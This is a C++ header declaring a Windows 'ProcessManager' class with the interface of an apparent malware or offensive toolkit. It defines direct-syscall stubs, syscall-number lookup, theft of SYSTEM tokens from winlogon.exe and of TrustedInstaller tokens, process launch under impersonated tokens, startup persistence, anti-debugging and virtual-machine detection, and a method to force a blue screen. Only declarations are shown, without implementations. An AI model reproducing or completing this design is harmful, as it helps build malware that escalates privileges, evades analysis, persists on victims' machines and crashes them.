#pragma once

#include <string>
#include <unordered_map>
#include <windows.h>
#include <winternl.h>
#include <any>
#include <iostream>


#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

typedef enum _SHUTDOWN_ACTION {
    ShutdownNoReboot,
    ShutdownReboot,
    ShutdownPowerOff
} SHUTDOWN_ACTION, *PSHUTDOWN_ACTION;

typedef enum _KEY_VALUE_INFORMATION_CLASS {
    KeyValueBasicInformation,
    KeyValueFullInformation,
    KeyValuePartialInformation,
    KeyValueFullInformationAlign64,
    KeyValuePartialInformationAlign64,
    KeyValueLayerInformation,
    MaxKeyValueInfoClass
} KEY_VALUE_INFORMATION_CLASS;

typedef struct _CLIENT_ID *PCLIENT_ID;

extern "C" {
    NTSTATUS SysNtOpenProcess(
        PHANDLE ProcessHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        PCLIENT_ID ClientId
    );
    
    NTSTATUS SysNtClose(HANDLE handle);
    
    NTSTATUS SysNtDuplicateToken(
        HANDLE ExistingTokenHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        BOOLEAN EffectiveOnly,
        TOKEN_TYPE Type,
        PHANDLE NewTokenHandle
    );
    
    NTSTATUS SysNtOpenProcessTokenEx(
        HANDLE processHandle,
        ACCESS_MASK desiredAccess,
        ULONG handleAttributes,
        PHANDLE tokenHandle
    );
    
    NTSTATUS SysNtRaiseHardError(
        NTSTATUS ErrorStatus,
        ULONG NumberOfParameters,
        ULONG UnicodeStringParameterMask,
        PULONG_PTR Parameters,
        ULONG ValidResponseOptions,
        PULONG Response
    );
    
    NTSTATUS SysNtRevertContainerImpersonation();
    
    NTSTATUS SysNtCreateKey(
        PHANDLE KeyHandle,
        ACCESS_MASK DesiredAccess,
        POBJECT_ATTRIBUTES ObjectAttributes,
        ULONG TitleIndex,
        PUNICODE_STRING Class,
        ULONG CreateOptions,
        PULONG Disposition
    );
    
    NTSTATUS SysNtSetValueKey(
        HANDLE KeyHandle,
        PUNICODE_STRING ValueName,
        ULONG TitleIndex,
        ULONG Type,
        PVOID Data,
        ULONG DataSize
    );
    
    NTSTATUS SysNtDelayExecution(BOOLEAN Alertable, PLARGE_INTEGER DelayInterval);
    
    NTSTATUS SysNtShutdownSystem(SHUTDOWN_ACTION action);

    PPEB GetPebAddress();
}

// dynamically loaded dlls
inline HMODULE Kernel32DLL = nullptr;
inline HMODULE NTDLL       = nullptr;
inline HMODULE AdvApi32DLL = nullptr;
inline bool    DllsLoaded  = false;

template <typename fp>
struct FunctionPointer {
    fp          call;
    std::string name;
    HMODULE     from;
};

enum class SecurityContext {
    User,
    Admin,
    System,
    TrustedInstaller,
    Highest = TrustedInstaller,
};

class ProcessManager {
public:
    ProcessManager();

    inline const SecurityContext GetProcessSecurityContext() const { return this->m_Context; }
    HMODULE            GetLoadedLib(const std::string& libName);                    // Return a handle of an already loaded dll from 'loadedDlls'
    BOOL               FreeUsedLibrary(const std::string& lib);                     // Free a loaded library 'lib'
    static void        ShutdownSystem(SHUTDOWN_ACTION type);
    DWORD              PIDFromName(const char* name);                               // Get the process ID from a process name.
    HANDLE             ImpersonateWithToken(HANDLE token);                          // Impersonate security context of 'token' for this thread
    HANDLE             CreateProcessAccessToken(DWORD processID, bool ti=false);    // Duplicate a process security token from the process id
    DWORD              StartWindowsService(const std::string& serviceName);         // Start a Windows service 'serviceName'—return process id.
    HANDLE             GetSystemToken();                                            // Get a SYSTEM permissions security token from winlogon.exe.
    HANDLE             GetTrustedInstallerToken();                                  // Obtain a Trusted Installer security token.
    static bool        BeingDebugged();                                             // Check if the current process is being debugged by looking at PEB
    void               BSOD();                                                      // Cause a blue screen of death on the current machine
    inline HANDLE      GetToken() const { return this->m_ElevatedToken; }
    static UINT        GetSSN(HMODULE lib, std::string functionName);
    void               AddProcessToStartup(std::string path);
    bool               RunningInVirtualMachine();
    static FARPROC     GetFunctionAddressInternal(HMODULE lib, std::string procedure); // Get a function pointer to an export function 'procedure' located in 'lib'
    BOOL               OpenProcessAsImposter(HANDLE token, 
                                             DWORD dwLogonFlags, 
                                             LPCWSTR lpApplicationName, 
                                             LPWSTR lpCommandLine, 
                                             DWORD dwCreationFlags, 
                                             LPVOID lpEnvironment, 
                                             LPCWSTR lpCurrentDirectory, 
                                             bool saveOutput, 
                                             std::string& cmdOutput);
    BOOL               ElevatedPermissions();

    template <typename fp>
    inline const FunctionPointer<fp> GetNative(const std::string& name) {
        if ( !this->m_Natives.contains(name) )
            return {};

        return std::any_cast< FunctionPointer<fp> >( this->m_Natives.at(name) );
    }

    template <typename fpType>
    static inline fpType GetFunctionAddress(HMODULE lib, const std::string& proc) {
        return reinterpret_cast< fpType >( GetFunctionAddressInternal(lib, proc) );
    }
    
    template <typename fpType, typename ...Args>
    static inline auto Call(HMODULE lib, std::string name, Args&&... args) noexcept {
        return GetFunctionAddress<fpType>(lib, name)( std::forward<Args>(args)... );
    }

    const BOOL NativesLoaded() const { return this->m_NativesLoaded; }

private:
    inline static std::unordered_map<std::string, std::any> m_Natives; // native function pointers
    std::unordered_map<std::string, HMODULE> m_LoadedDLLs;
    BOOL               m_NativesLoaded    = FALSE;
    SecurityContext    m_Context          = SecurityContext::User;
    HANDLE             m_ElevatedToken    = NULL;

    template <typename type>
    void               LoadNative(const std::string& name, HMODULE from);
    void               LoadAllNatives();
    HMODULE            GetLoadedModule(std::string libName); // Get the handle of a dll 'libname'};
    void               SetThisContext(SecurityContext newContext);
};